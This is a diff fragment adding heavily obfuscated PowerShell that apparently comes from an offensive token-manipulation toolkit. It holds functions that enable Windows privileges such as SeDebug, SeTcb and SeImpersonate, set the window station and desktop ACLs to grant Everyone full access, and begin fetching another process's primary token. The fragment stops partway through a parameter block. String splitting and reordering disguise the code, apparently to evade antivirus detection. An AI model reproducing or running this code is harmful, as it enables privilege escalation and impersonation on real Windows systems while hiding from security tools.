+    ${LoOku`pPR`ivIL`EgeNA`meW} =   $KajtE::("{0}{5}{2}{3}{6}{4}{1}"-f'GetDele','ionPointer','a','teForFu','ct','g','n').Invoke(${L`O`okuPpriViL`egeNaMEWad`DR}, ${l`o`okUPPr`IvILe`gEnAmE`wDElEg`Ate})
+    
+
+
+    
+    Function AD`d-SigNediNT`Asun`SIGnED
+	{
+		Param(
+		[Parameter(PoSitIon = 0, mandaTory = ${TR`UE})]
+		[Int64]
+		${VAL`U`E1},
+		
+		[Parameter(POsitiON = 1, mandatORY = ${T`Rue})]
+		[Int64]
+		${VaLu`e2}
+		)
+		
+		[Byte[]]${v`ALUe`1by`TEs} =   $1CYl::("{0}{1}" -f 'GetB','ytes').Invoke(${VA`lUE1})
+		[Byte[]]${vAlue2b`y`T`eS} =  (  &("{2}{1}{0}" -f'BlE','ia','vaR') 1cYl  -vALUeonLy )::("{1}{2}{0}" -f 'tes','GetB','y').Invoke(${v`Al`UE2})
+		[Byte[]]${FI`NaL`B`YteS} =   (  &("{1}{0}"-f'ci','G')  ('V'+'A'+'ri'+'a'+'Ble:1CyL'))."VA`LuE"::"gETb`yT`Es"([UInt64]0)
+
+		if (${V`ALue`1BYt`eS}."c`OunT" -eq ${vaLuE2BY`T`es}."c`ouNt")
+		{
+			${cARR`YOV`Er} = 0
+			for (${I} = 0; ${i} -lt ${VA`l`U`e1BYtEs}."Co`UnT"; ${i}++)
+			{
+				
+				[UInt16]${S`Um} = ${va`Lue`1byTeS}[${i}] + ${vaLu`E2`BYTES}[${i}] + ${cA`R`RYov`er}
+
+				${fiN`ALByT`ES}[${i}] = ${S`Um} -band 0x00FF
+				
+				if ((${s`UM} -band 0xFF00) -eq 0x100)
+				{
+					${Ca`RRyoV`eR} = 1
+				}
+				else
+				{
+					${Ca`R`R`YOvEr} = 0
+				}
+			}
+		}
+		else
+		{
+			Throw ("{5}{1}{6}{8}{10}{2}{3}{0}{4}{9}{7}"-f'differen','t ','ra','ys of ','t','Canno','a','zes','dd bytea',' si','r')
+		}
+		
+		return   (  &("{0}{1}{2}"-f'c','Hildi','tem') VaRIAbLe:1CYl )."VaL`Ue"::("{1}{0}"-f '4','ToInt6').Invoke(${Fi`NALBY`T`es}, 0)
+	}
+
+
+    
+    function E`NAb`LE`-Se`AsSIgNpRI`MAR`Yt`Ok`eNp`RiVi`LEgE
+    {	
+	    [IntPtr]${t`HrE`A`dHan`DlE} = ${getc`U`RrEN`TthR`E`Ad}."InVo`ke"()
+	    if (${t`HREAd`Ha`NdLE} -eq   $s2a::"z`ERo")
+	    {
+		    Throw ("{8}{0}{2}{7}{4}{5}{6}{1}{3}{9}"-f 'able to','th',' get','re','ndle to',' the cu','rrent ',' the ha','Un','ad')
+	    }
+		
+	    [IntPtr]${t`hreA`dTokEn} =   (&("{0}{1}" -f 'it','em')  VarIAblE:S2a  )."Va`Lue"::"ZE`Ro"
+	    [Bool]${R`E`suLT} = ${OpenT`HRea`dt`o`KeN}."inv`oKe"(${T`hREaDHa`NDle}, ${wi`N3`2c`OnstAn`Ts}."T`O`KeN_QUEry" -bor ${wiN32C`O`NSTA`N`TS}."T`oKEN_a`DjUst`_P`RI`ViLEg`ES", ${f`A`lSe}, [Ref]${tH`Re`AD`TOkeN})
+        ${E`RRoR`Code} =  (&("{2}{1}{0}" -f'AblE','Ri','Get-Va') ("KAJT"+"e"))."Va`LUe"::("{2}{1}{3}{0}{4}"-f'rro','etLas','G','tWin32E','r').Invoke()
+
+	    if (${rES`Ult} -eq ${F`AlsE})
+	    {
+		    if (${error`co`de} -eq ${wiN32c`oNS`T`AN`TS}."e`RrOR_`NO_toK`En")
+		    {
+			    ${R`EsU`Lt} = ${i`mPErSO`NatESeLf}."i`NVokE"(${Win32cOnsT`A`NtS}."SECURI`T`y_dEl`Eg`ATi`ON")
+			    if (${rE`sU`LT} -eq ${f`AlsE})
+			    {
+				    Throw (&("{2}{3}{1}{0}" -f 'Object','w-','N','e') ("{4}{8}{6}{7}{1}{5}{2}{0}{3}"-f'cep','t','Win32Ex','tion','Comp','Model.','n','en','o'))
+			    }
+				
+			    ${r`EsU`Lt} = ${OpeN`TH`ReA`dToKEn}."IN`VOKe"(${Thre`Adh`A`ND`lE}, ${WI`N3`2conStAn`TS}."T`okEn_`QU`ery" -bor ${win32`co`N`sTaN`TS}."tOKEN_A`DJU`ST`_PR`I`V`ileGES", ${fa`lSe}, [Ref]${tHR`E`Ad`ToKEn})
+			    if (${r`Es`Ult} -eq ${f`Al`SE})
+			    {
+				    Throw (&("{1}{2}{0}"-f'ect','New-O','bj') ("{6}{2}{4}{3}{7}{5}{0}{1}" -f'32Excep','tion','on','ntMo','e','n','Comp','del.Wi'))
+			    }
+		    }
+		    else
+		    {
+			    Throw ([ComponentModel.Win32Exception] ${eRrO`R`cOdE})
+		    }
+	    }
+
+        ${clo`SeHA`NDLe}."i`NVOKE"(${ThreAdH`A`NDle}) | &("{1}{0}"-f 'l','Out-Nul')
+	
+        ${lU`ID`S`IZe} =  ( &("{0}{1}{2}"-f 'variA','B','Le')  KaJTe)."Va`Lue"::"s`izEOf"([Type]${L`UiD})
+        ${l`Ui`dptR} =   $KAJTE::("{0}{1}{2}{3}" -f'A','llocHG','l','obal').Invoke(${LUID`SI`Ze})
+        ${l`UIdOBj`E`Ct} =  (  &("{0}{2}{1}" -f 'V','Riable','a') kaJTE )."V`AlUE"::"pTRto`stru`c`TURe"(${l`UId`ptr}, [Type]${L`Uid})
+         ( &("{3}{1}{0}{2}" -f 'l','t-VArIab','E','gE') ("KaJ"+"te"))."v`ALUe"::("{0}{1}{2}" -f'FreeH','Gl','obal').Invoke(${L`UiDP`Tr})
+
+	    ${r`Esult} = ${LOOk`UPprIvIlE`GEVAl`UE}."iN`Voke"(${nU`LL}, ("{5}{4}{3}{6}{8}{7}{2}{0}{1}" -f 'l','ege','aryTokenPrivi','s','eAs','S','ign','rim','P'), [Ref] ${Luid`OB`JeCt})
+
+	    if (${re`sUlt} -eq ${f`AL`Se})
+	    {
+		    Throw (&("{0}{2}{1}"-f 'New','Object','-') ("{5}{0}{3}{7}{8}{1}{4}{6}{2}"-f 'one','n3','on','nt','2','Comp','Excepti','M','odel.Wi'))
+	    }
+
+        [UInt32]${Lu`IDAND`ATTrI`Bu`TesSizE} =   (  &("{1}{2}{0}"-f'TEm','ch','ilDI') VarIABLE:kaJTE  )."Val`UE"::"SI`zEOF"([Type]${luI`D_An`d_at`T`RiBUtEs})
+        ${lU`Ida`NdA`TtrI`B`UTEsPTr} =   $kAJte::("{0}{2}{3}{1}" -f'Alloc','al','HGlo','b').Invoke(${lU`ID`A`NdATTrIBute`S`SIZe})
+        ${luIDAND`A`TTRi`BUtes} =   (&("{0}{3}{1}{2}"-f 'gEt-vARIA','L','e','B')  ("ka"+"Jte")  )."VAL`UE"::"ptrTO`sT`RUCTU`Re"(${LuIdaN`d`ATTrIBute`Sp`TR}, [Type]${Luid_AnD_`At`T`Ri`Bu`TES})
+          ( &("{3}{2}{1}{0}"-f 'Le','b','-VarIA','GeT')  ("KaJT"+"e")  -VAlu  )::("{3}{2}{0}{1}"-f'oba','l','eeHGl','Fr').Invoke(${LuiDaNdAT`TrI`Bu`TE`sPtR})
+
+        ${l`Ui`DaNdA`TtriB`UT`ES}."Lu`iD" = ${lU`Idobj`ECT}
+        ${Luid`AnDaTt`RIBuT`es}."at`TrIbU`TEs" = ${w`In32C`on`sT`ANts}."SE_`prIvILeG`e_ENAB`LeD"
+
+        [UInt32]${To`KENpri`V`s`iZE} =   (  &("{2}{0}{3}{1}" -f'E','em','G','t-cHIlDIT') ("v"+"aRiA"+"ble:k"+"aJT"+"E")  )."Val`UE"::"SiZE`OF"([Type]${T`O`K`en_PrIv`IlE`GeS})
+        ${T`OK`ENPRIVIleg`EsPTR} =  $KaJtE::("{2}{3}{1}{0}"-f'HGlobal','oc','A','ll').Invoke(${TOkEn`pr`I`V`siZE})
+        ${t`O`KEnPrIvIL`EG`eS} =  ( &("{1}{0}{3}{2}" -f't-VAR','GE','LE','iab') KajtE )."Va`LUe"::"PTrtost`RU`cTURe"(${TOke`NPRi`V`iLEGeSpTR}, [Type]${ToKEn`_Pr`i`ViLeG`ES})
+          (  &("{2}{1}{0}"-f'm','t-iTe','GE') ("VA"+"riAb"+"L"+"e:"+"kajTe") )."V`ALUe"::("{0}{2}{1}"-f'FreeH','l','Globa').Invoke(${TO`ken`PrivIlEg`E`SPTR})
+	    ${To`kenprIvil`e`G`Es}."PRiVIle`GEco`UNt" = 1
+	    ${T`oKenpr`I`V`IlegeS}."P`RIv`ILE`GES" = ${LuiD`AnD`AT`Tri`BU`Tes}
+
+        ${gLObal`:t`ok`En`pRIV} = ${Tok`En`Pr`ivIlEGeS}
+
+	    ${rE`S`Ult} = ${adJ`USt`ToKe`NP`RIv`ileGes}."INv`O`Ke"(${T`hReadTOK`EN}, ${fA`lse}, [Ref] ${tokeNpRI`Vi`Le`ges}, ${TOKen`pRI`VS`izE},   (  &("{0}{2}{1}{3}"-f 'GET-C','d','HIL','ItEM') VaRiABLE:S2A )."vaL`UE"::"ze`RO",   (  &("{1}{2}{0}" -f'iaBLe','va','r') ('S2'+'A')  -vALuEOn )::"ZE`Ro")
+	    if (${REs`U`Lt} -eq ${F`AL`Se})
+	    {
+            Throw (&("{0}{2}{1}" -f'New-','ct','Obje') ("{6}{3}{5}{1}{0}{2}{4}"-f'Model.Win3','nt','2Excep','pon','tion','e','Com'))
+	    }
+
+        ${c`Lo`seHA`NDLe}."InVO`kE"(${ThrEAd`T`OKEN}) | &("{1}{2}{0}" -f 'll','Out-N','u')
+    }
+
+
+    
+    function EnA`BlE-PRi`ViL`E`gE
+    {
+        Param(
+            [Parameter()]
+            [ValidateSet({"{0}{2}{4}{1}{3}"-f 'SeA','Priv','ssignPrimaryT','ilege','oken'}, {"{0}{3}{2}{4}{1}"-f'S','ge','uditPr','eA','ivile'}, {"{1}{0}{3}{2}{4}" -f 'Backu','Se','Privi','p','lege'}, {"{2}{4}{0}{5}{1}{3}"-f'Notify','v','SeC','ilege','hange','Pri'}, {"{0}{4}{2}{5}{3}{1}" -f'Se','ege','reateG','obalPrivil','C','l'},
+                {"{1}{0}{6}{4}{3}{2}{5}" -f'atePa','SeCre','ri','leP','efi','vilege','g'}, {"{5}{4}{0}{3}{1}{2}"-f'ePe','vil','ege','rmanentPri','reat','SeC'}, {"{5}{1}{0}{2}{3}{4}{6}" -f 'ate','e','Sy','mbo','licLinkPri','SeCr','vilege'}, {"{5}{0}{4}{1}{2}{3}" -f'reateTo','r','iv','ilege','kenP','SeC'},
+                {"{3}{1}{4}{0}{2}" -f 'leg','ugPri','e','SeDeb','vi'}, {"{0}{7}{3}{4}{8}{1}{6}{5}{2}"-f'SeEna','P','e','l','eDe','ivileg','r','b','legation'}, {"{1}{0}{6}{3}{4}{2}{5}"-f'r','SeImpe','g','Privi','le','e','sonate'}, {"{4}{6}{7}{3}{1}{2}{5}{0}"-f'lege','io','ri','Pr','S','tyPrivi','eI','ncreaseBase'},
+                {"{6}{2}{5}{0}{4}{3}{1}" -f 'r','e','eIn','leg','ivi','creaseQuotaP','S'}, {"{6}{5}{1}{3}{0}{4}{2}"-f'eWor','a','Privilege','s','kingSet','Incre','Se'}, {"{3}{4}{0}{1}{2}" -f'erP','rivi','lege','SeLoa','dDriv'}, {"{3}{2}{1}{0}"-f'ivilege','moryPr','ockMe','SeL'}, {"{3}{0}{6}{5}{4}{2}{7}{1}"-f 'eMa','lege','A','S','ne','hi','c','ccountPrivi'},
+                {"{1}{0}{6}{3}{2}{5}{4}" -f'na','SeMa','o','eV','ePrivilege','lum','g'}, {"{7}{4}{1}{2}{3}{6}{0}{5}" -f 'g','fileS','ing','l','ro','e','eProcessPrivile','SeP'}, {"{1}{5}{2}{4}{0}{3}" -f 'g','SeR','l','e','Privile','elabe'}, {"{3}{1}{5}{4}{0}{2}" -f'g','emo','e','SeR','rivile','teShutdownP'}, {"{3}{1}{2}{4}{5}{0}" -f 'vilege','es','t','SeR','o','rePri'},
+                {"{4}{2}{0}{3}{1}" -f 'ityP','vilege','Secur','ri','Se'}, {"{3}{0}{2}{1}{5}{4}" -f'Shut','nPr','dow','Se','lege','ivi'}, {"{2}{4}{3}{0}{1}{5}"-f'gentP','rivile','SeSy','cA','n','ge'}, {"{5}{0}{3}{4}{1}{6}{2}"-f 'e','Pri','ge','mE','nvironment','SeSyst','vile'}, {"{4}{1}{5}{0}{2}{3}" -f'iv','rofileP','i','lege','SeSystemP','r'},
+                {"{2}{0}{1}{4}{3}" -f'Sys','temti','Se','ivilege','mePr'}, {"{2}{4}{3}{0}{5}{1}"-f 'ners','rivilege','S','keOw','eTa','hipP'}, {"{1}{0}{3}{2}" -f'i','SeTcbPr','ge','vile'}, {"{3}{1}{5}{2}{4}{0}" -f'ilege','Time','ePr','Se','iv','Zon'}, {"{1}{2}{0}{5}{3}{4}"-f'ri','Se','TrustedCredManAccessP','ileg','e','v'},
+                {"{4}{2}{0}{1}{3}"-f'c','kPri','Undo','vilege','Se'}, {"{4}{0}{3}{5}{2}{7}{6}{1}"-f 'U','ge','tedInp','nsoli','Se','ci','le','utPrivi'})]
+            [String]
+            ${pRiV`iLe`gE}
+        )
+
+	    [IntPtr]${T`HrE`AdHaN`dle} = ${Ge`TCURr`Ent`Thre`AD}."IN`VOke"()
+	    if (${ThR`EaD`HANdLe} -eq  $s2A::"ZE`RO")
+	    {
+		    Throw ("{9}{4}{5}{6}{2}{0}{8}{1}{7}{3}" -f'an','h','e h','nt thread','ble to ','g','et th','e curre','dle to t','Una')
+	    }
+		
+	    [IntPtr]${tHrE`A`dtO`ken} =  (  &("{0}{2}{1}"-f'VArI','bLe','a') S2a )."vaL`UE"::"zE`RO"
+	    [Bool]${re`S`Ult} = ${oPENT`Hre`AdtO`KEN}."In`V`oKe"(${t`hrea`dH`ANd`le}, ${w`IN`3`2`ConstAnts}."tOken`_QUe`Ry" -bor ${W`i`N32conS`T`AntS}."TOkE`N`_`AdjusT`_P`RivI`LE`gES", ${F`Al`se}, [Ref]${t`H`ReadTO`ken})
+        ${ERRo`Rc`ode} =   ( &("{0}{1}{2}"-f 'VARi','ab','Le')  ('k'+'aJTe')  )."V`AluE"::("{0}{1}{2}{3}{4}" -f 'G','etLas','tW','i','n32Error').Invoke()
+
+	    if (${re`Su`lT} -eq ${F`AlSe})
+	    {
+		    if (${e`R`RoRcOde} -eq ${w`In32`C`OnSt`AnTS}."eRRor`_`No_ToKen")
+		    {
+			    ${R`ES`ULT} = ${ImPERSO`N`ATE`SElf}."I`N`VokE"(${WIN`32CO`NstA`Nts}."se`CuRiT`y`_delegatioN")
+			    if (${r`e`suLT} -eq ${f`A`LsE})
+			    {
+				    Throw (&("{0}{1}{2}"-f 'New-Ob','j','ect') ("{0}{5}{1}{3}{4}{6}{2}"-f'Compo','nt','ion','Model.W','i','ne','n32Except'))
+			    }
+				
+			    ${re`su`lT} = ${Ope`Nt`H`ReaDtOKeN}."iN`VoKe"(${Th`Rea`d`haNDLE}, ${WI`N`32`CoNSTaNtS}."TOK`E`N_Query" -bor ${WI`N`32cO`NStA`NTs}."T`OKEN_A`dJu`St_PrivI`lEgES", ${fa`lse}, [Ref]${t`hREa`DtOkeN})
+			    if (${rE`su`lT} -eq ${FAl`SE})
+			    {
+				    Throw (&("{0}{1}{2}"-f'New-Ob','j','ect') ("{6}{0}{4}{1}{3}{2}{5}"-f'onent','odel.Win','2Except','3','M','ion','Comp'))
+			    }
+		    }
+		    else
+		    {
+			    Throw ([ComponentModel.Win32Exception] ${Er`RoR`c`ODe})
+		    }
+	    }
+
+        ${CLOS`eh`An`dLe}."I`NvOKe"(${t`hrE`ADHanD`le}) | &("{0}{1}{2}"-f'O','ut-N','ull')
+	
+        ${L`UiD`sIZE} =   ( &("{2}{1}{0}" -f'ABlE','I','var') kAjtE  -VAL)::"Si`ZEOf"([Type]${L`Uid})
+        ${lU`IDptr} =  (&('lS')  ('vA'+'riA'+'BL'+'E:kaJTE') )."v`ALue"::("{2}{0}{3}{1}" -f 'l','lobal','A','locHG').Invoke(${l`Uids`IZe})
+        ${LuIdo`B`jeCT} =  $KAjte::"pTRToSTR`U`ct`URE"(${LuI`d`PtR}, [Type]${L`UID})
+          $KAjTe::("{1}{2}{0}{3}"-f'a','Fr','eeHGlob','l').Invoke(${Lu`id`PTr})
+
+	    ${re`Su`lT} = ${LOOKUPp`RIVIL`eGev`AL`Ue}."IN`VokE"(${n`ULl}, ${p`R`iv`ilEGE}, [Ref] ${lu`i`DOBjEcT})
+
+	    if (${Res`UlT} -eq ${f`Alse})
+	    {
+		    Throw (&("{1}{0}{2}" -f'b','New-O','ject') ("{3}{4}{1}{0}{2}{5}" -f'ntModel','ne','.Win32Excep','Co','mpo','tion'))
+	    }
+
+        [UInt32]${L`UIDANd`ATT`RiBUt`EssIze} =   $kajtE::"s`i`zEOf"([Type]${LuiD`_`ANd`_AtTRI`BUT`es})
+        ${LUIDa`N`dAT`TrIBUTes`pTr} =  (  &("{0}{1}{3}{2}" -f 'get','-Va','BLE','rIA') ('k'+'AjTe') )."v`ALue"::("{0}{2}{1}"-f 'AllocHG','obal','l').Invoke(${Lu`i`dANd`A`Ttri`B`UTEssiZe})
+        ${l`UIDaN`dA`TTRIBU`TES} =  (  &("{1}{0}" -f 'I','Gc')  vArIabLE:Kajte)."vaL`UE"::"PTrt`OSt`RUc`Tu`RE"(${Lui`dA`NDaTt`Ri`B`UTeSPTr}, [Type]${LuID_and`_`AtTRib`U`TeS})
+          $kajTE::("{1}{2}{3}{0}" -f'l','Fr','eeHG','loba').Invoke(${lU`IdandAT`Trib`Ut`ES`PTR})
+
+        ${LuI`DanDA`TTrI`B`UtES}."L`UiD" = ${L`UIdoBJ`eCT}
+        ${luiD`AND`A`TTRi`BU`TEs}."A`Tt`RiBUTes" = ${WiN3`2`c`OnstAntS}."s`e_p`R`IvILE`G`E_enaBLED"
+
+        [UInt32]${TOk`e`NprIV`Si`ZE} =  $KajtE::"S`iz`Eof"([Type]${t`ok`eN`_privilegeS})
+        ${tO`KENpRI`V`ILE`Ge`SPtr} =   (&("{1}{0}{3}{2}"-f 'eT-vA','g','e','RIaBl') KajTE )."vAl`UE"::("{1}{3}{0}{2}" -f'lo','Alloc','bal','HG').Invoke(${t`OKeN`Pr`IvSiZe})
+        ${To`k`e`NpRivILEGEs} =  (  &("{1}{0}" -f 'r','Di')  Variable:kaJTE)."vA`Lue"::"p`T`RTo`STr`UCturE"(${toK`e`N`PrIv`I`lEgEs`PtR}, [Type]${TokEN`_p`RIViLE`GES})
+          $kAJTe::("{3}{1}{2}{0}"-f'bal','r','eeHGlo','F').Invoke(${tokenpriV`Il`E`Gesptr})
+	    ${tOK`EnprIv`ILE`Ges}."prIV`ILE`geCOU`NT" = 1
+	    ${tOKeNPRIVI`Le`G`es}."PrIvi`Leg`ES" = ${LUi`D`AN`Dattri`BuT`es}
+
+        ${g`lo`BA`l:tO`k`enPRiv} = ${TOK`EnPRI`Vil`eges}
+
+        &("{0}{2}{1}" -f'Write-Verb','se','o') ('Attem'+'p'+'ting '+'t'+'o '+'enab'+'le '+'p'+'rivileg'+'e: '+"$Privilege")
+	    ${RESU`lt} = ${aDJus`TT`okeNp`RiVIL`E`g`eS}."INvO`Ke"(${Thr`e`Adt`Oken}, ${F`ALSe}, [Ref] ${tokeN`p`R`IvIlEgeS}, ${tOkenP`Ri`V`s`IZE},   ( &("{2}{0}{1}"-f'e','t-VAriabLE','g') S2a  )."vAL`Ue"::"ze`Ro",   $S2A::"Ze`RO")
+	    if (${re`suLt} -eq ${F`AL`sE})
+	    {
+            Throw (&("{2}{0}{1}" -f '-Obje','ct','New') ("{0}{2}{6}{4}{1}{3}{5}" -f 'C','tModel.W','o','in','n','32Exception','mpone'))
+	    }
+
+        ${c`l`OSEHa`NdLe}."In`VoKe"(${TH`REadt`Ok`EN}) | &("{2}{1}{0}" -f 'Null','-','Out')
+        &("{2}{3}{1}{0}{4}"-f 'erb','V','Wri','te-','ose') ('E'+'nable'+'d '+'privi'+'lege:'+' '+"$Privilege")
+    }
+
+
+    
+    function s`eT`-deskt`OPA`CLS
+    {
+        &("{2}{4}{0}{1}{3}" -f '-','Privile','Enab','ge','le') -Privilege ("{0}{1}{3}{2}" -f 'SeSe','cu','vilege','rityPri')
+
+        
+        ${W`INdO`wStAT`IoNstr} =   $KaJtE::("{1}{2}{5}{4}{0}{3}" -f'balU','String','To','ni','o','HGl').Invoke(("{2}{1}{0}" -f 'a0','inSt','W'))
+        ${h`Wi`Nsta} = ${oPe`NwiNdOw`sT`ATi`o`NW}."in`VOkE"(${W`inDoWStA`TI`O`Nstr}, ${fA`LsE}, ${w`In32CoNStAN`Ts}."acCess_Sy`s`Tem_securi`TY" -bor ${wI`N32coNS`Ta`N`Ts}."Re`Ad`_c`oNTrOL" -bor ${Win`3`2ConSt`AntS}."wr`iTe_`d`AC")
+
+        if (${h`WIns`TA} -eq   $S2A::"z`erO")
+        {
+            Throw (&("{0}{3}{1}{2}" -f 'Ne','bjec','t','w-O') ("{7}{1}{4}{6}{5}{3}{2}{0}"-f 'Exception','mpon','.Win32','del','en','Mo','t','Co'))
+        }
+
+        &("{0}{5}{3}{1}{2}{7}{4}{6}" -f'Set','ACLTo','A','Desktop','o','-','wEveryone','ll') -hObject ${h`WiNSTa}
+        ${cLos`e`HaN`DlE}."iNVO`kE"(${hw`INs`Ta}) | &("{0}{1}{2}" -f 'O','ut-','Null')
+
+        
+        ${HdesK`T`OP} = ${O`pE`N`DeSKTO`Pa}."In`VOke"(("{2}{0}{1}" -f 'faul','t','de'), 0, ${F`AlSe}, ${WiN32c`ONs`TAn`Ts}."D`ESktoP_gEN`er`Ic_alL" -bor ${wi`N32`ConST`AnTs}."W`RiTe`_DAC")
+        if (${H`dE`sk`TOP} -eq  (  &("{2}{1}{0}" -f'iaBlE','aR','v')  ('S2'+'a') -vaL  )::"Z`ERo")
+        {
+            Throw (&("{1}{0}{2}" -f 'Obj','New-','ect') ("{1}{6}{2}{4}{0}{3}{8}{5}{7}" -f'E','Com','nentMo','xce','del.Win32','t','po','ion','p'))
+        }
+
+        &("{5}{4}{6}{7}{3}{0}{2}{8}{1}"-f 'oA','e','llowEve','CLT','-','Set','D','esktopA','ryon') -hObject ${Hd`eS`KtOp}
+        ${Cl`oseh`ANdLe}."in`VoKe"(${hDE`sKT`OP}) | &("{2}{0}{1}" -f'ut','-Null','O')
+    }
+
+
+    function sET-DeSk`Topac`L`T`OaLl`oWEV`erY`oNE
+    {
+        Param(
+            [IntPtr]${hO`BJeCT}
+            )
+
+        [IntPtr]${Pp`S`idO`WnER} =  $s2a::"zE`Ro"
+        [IntPtr]${pP`s`idG`RouP} =  ( &("{1}{0}{2}" -f'i','CHiLD','TeM')  vARIable:s2A  )."vAL`Ue"::"ZE`Ro"
+        [IntPtr]${pp`D`AcL} =   (  &("{0}{1}" -f 'VArIAB','le') ('S2'+'A') -vAlUEoNlY )::"z`ERO"
+        [IntPtr]${PpS`A`cL} =  (  &("{0}{1}"-f'G','CI') ("VARIAB"+"le:"+"s"+"2a")  )."VAl`Ue"::"ZE`Ro"
+        [IntPtr]${PP`s`eC`URITYdESCRI`pTOr} =   $S2A::"Z`ErO"
+        
+        ${RE`TvAl} = ${gEtS`E`Curit`yI`NFo}."INv`O`Ke"(${H`OBJ`ECt}, 0x7, ${WiN`32`coNST`An`Ts}."dacl_Secur`IT`y_IN`F`oR`m`Ation", [Ref]${ppS`i`dow`Ner}, [Ref]${P`PS`id`groUP}, [Ref]${p`pD`ACl}, [Ref]${ppsA`cL}, [Ref]${ppSe`Cu`RIt`yDESC`Ri`P`ToR})
+        if (${Retv`Al} -ne 0)
+        {
+            &("{1}{0}{2}{3}" -f'e-','Writ','Erro','r') ('Unabl'+'e '+'to'+' '+'cal'+'l '+'GetSe'+'curi'+'ty'+'Info.'+' '+'E'+'rrorCode:'+' '+"$retVal")
+        }
+
+        if (${P`P`Dacl} -ne   $S2A::"z`erO")
+        {
+            ${AclO`Bj} =  (  &("{3}{0}{2}{1}"-f '-va','abLE','ri','Get') ('K'+'ajTE') )."val`Ue"::"Pt`RtoSt`Ru`CTuRe"(${ppdA`CL}, [Type]${A`CL})
+
+            
+            [UInt32]${Re`A`Lsi`Ze} = 2000
+            ${pa`llus`eRSSId} =  (  &('Ls')  ("V"+"Ar"+"iAbLE:KAJte"))."VaL`Ue"::("{2}{0}{1}"-f 'Glo','bal','AllocH').Invoke(${re`ALsi`zE})
+            ${s`Ucc`eSS} = ${CRea`Te`we`LL`KN`OWNSid}."I`NVo`KE"(1,  (&("{2}{1}{0}"-f 'bLe','aRia','v') S2A  -VALUe  )::"ZE`Ro", ${p`Al`LusE`RSSID}, [Ref]${ReA`lsi`ze})
+            if (-not ${sUC`C`ESS})
+            {
+                Throw (&("{0}{2}{1}" -f'Ne','ect','w-Obj') ("{2}{1}{4}{5}{3}{6}{0}{8}{7}" -f 'Exc','ent','Compon','.Win','M','odel','32','ion','ept'))
+            }
+
+            
+            ${T`RuSTee`SIzE} =  $KAJTe::"S`iZ`eOf"([Type]${t`RU`STeE})
+            ${T`Ru`sTE`ePTr} =  $KajtE::("{2}{1}{0}"-f 'al','b','AllocHGlo').Invoke(${t`RUSTE`Es`iZE})
+            ${TR`UstEE`o`Bj} =   ( &("{1}{0}{2}" -f 'Et-vaR','g','IABLe') KAjte  -VAlUeo )::"ptrT`os`T`RUCT`Ure"(${TRUSt`Ee`pTR}, [Type]${TR`U`stee})
+             $kaJTe::("{1}{3}{0}{2}"-f 'eeH','F','Global','r').Invoke(${t`RU`S`TEePtR})
+            ${TrU`s`TeeOBJ}."pmu`lt`Iple`T`RuSTEe" =  $S2A::"zE`RO"
+            ${Tr`UST`E`EOBJ}."MUlT`I`P`l`ETRUSTEe`o`peraT`IOn" = 0
+            ${TRU`s`TEeoBJ}."Tr`U`sTeeFOrM" = ${Wi`N3`2`cOn`sTANTS}."Trust`ee_i`S_sid"
+            ${tRUs`Te`e`obj}."TrUsTe`e`T`Ype" = ${wiN32co`NSt`A`Nts}."TRUST`ee_is_we`lL_kNOwN`_gR`o`Up"
+            ${t`RusTe`EoBJ}."pT`STr`N`Ame" = ${p`Al`L`U`SERSSiD}
+
+            
+            ${eXpLi`CI`TacCeS`SSiZe} =  ( &("{0}{1}"-f 'geT-i','TeM')  ("vAR"+"IAbLE:k"+"aJtE"))."V`AluE"::"size`oF"([Type]${EXP`l`IcIt`_AccesS})
+            ${Ex`plICit`A`CceSs`PTR} =   ( &("{0}{1}" -f 'GET-ITE','M')  ("vA"+"riAblE"+":"+"KAjTE")  )."VA`LuE"::("{0}{1}{2}"-f'All','ocHGloba','l').Invoke(${exP`L`iciTacc`esSSI`ZE})
+            ${eX`P`lIC`ItaCCeSS} =  ( &("{0}{2}{1}"-f'v','blE','ARiA')  kAJTe)."V`AlUe"::"p`TRt`OStRuCTU`RE"(${eX`PLIc`itaCCe`s`SPTr}, [Type]${eX`PlI`cit_`AcCesS})
+              $KAjtE::("{0}{1}{2}"-f 'Fre','eHG','lobal').Invoke(${exPLIc`it`ACCE`SS`ptr})
+            ${E`XPLICiT`AC`CESS}."GrFa`Cces`SPerMissIO`NS" = 0xf03ff
+            ${EXpLi`CIt`ACCe`Ss}."GR`FAcce`s`sM`ODE" = ${W`in3`2c`onStA`Nts}."gRaNt`_Ac`C`esS"
+            ${e`XpLiCITAC`C`esS}."g`RF`IN`heRiTance" = ${WiN32CON`s`T`ANts}."oBJ`ECT_INher`IT`_ace"
+            ${eXPlI`cI`TAcC`esS}."t`RUSTEE" = ${tRU`Ste`EoBj}
+
+            [IntPtr]${N`eWD`ACL} =   $s2a::"z`Ero"
+
+            ${rET`Val} = ${SETEN`Tr`iE`sIn`Aclw}."iNv`OKe"(1, [Ref]${EX`PlI`CiTaCce`sS}, ${p`Pd`Acl}, [Ref]${Newd`ACL})
+            if (${ReTV`AL} -ne 0)
+            {
+                &("{3}{2}{0}{1}" -f't','e-Error','ri','W') ('Err'+'or '+'cal'+'ling'+' '+'SetEnt'+'ri'+'esIn'+'AclW'+': '+"$RetVal")
+            }
+
+             (  &("{0}{1}"-f'VarIABl','e') ("kaJt"+"e")  -VAlUEon)::("{0}{2}{3}{1}" -f'Fre','l','eHGlo','ba').Invoke(${PAl`LUSe`RSs`id})
+
+            if (${New`dA`CL} -eq   (&("{2}{3}{1}{0}"-f'ARiAbLe','-v','Ge','T') ('s'+'2A')  )."v`ALuE"::"Z`eRO")
+            {
+                throw ("{4}{1}{3}{0}{2}"-f 'nu',' is','ll',' ','New DACL')
+            }
+
+            
+            ${R`eT`VAl} = ${sE`T`SEC`URItyi`NFO}."iN`VOke"(${H`o`BjeCt}, 0x7, ${wi`N32CO`NS`Tan`Ts}."D`AcL_`sE`CuRi`Ty_iNF`oRMATi`On", ${p`Psid`own`ER}, ${pp`sI`DgRoUp}, ${ne`wD`ACL}, ${PP`S`ACL})
+            if (${Re`TVal} -ne 0)
+            {
+                &("{2}{1}{0}" -f'r','Erro','Write-') ('SetS'+'ecurityI'+'n'+'fo'+' '+'fai'+'led'+'. '+'R'+'eturn'+' '+'value:'+' '+"$RetVal")
+            }
+
+            ${LOC`A`lfrEE}."INV`OkE"(${ppS`e`curiTYDEscri`PToR}) | &("{2}{0}{1}"-f '-Nu','ll','Out')
+        }
+    }
+
+
+    
+    function GET-`pR`iM`ARY`TokEN
+    {
+        Param(
+            [Parameter(pOSItiOn=0, MandATorY=${t`RUE})]
+            [UInt32]
+            ${PR`o`ceSSiD},
+
+            
+            [Parameter()]
+            [Switch]
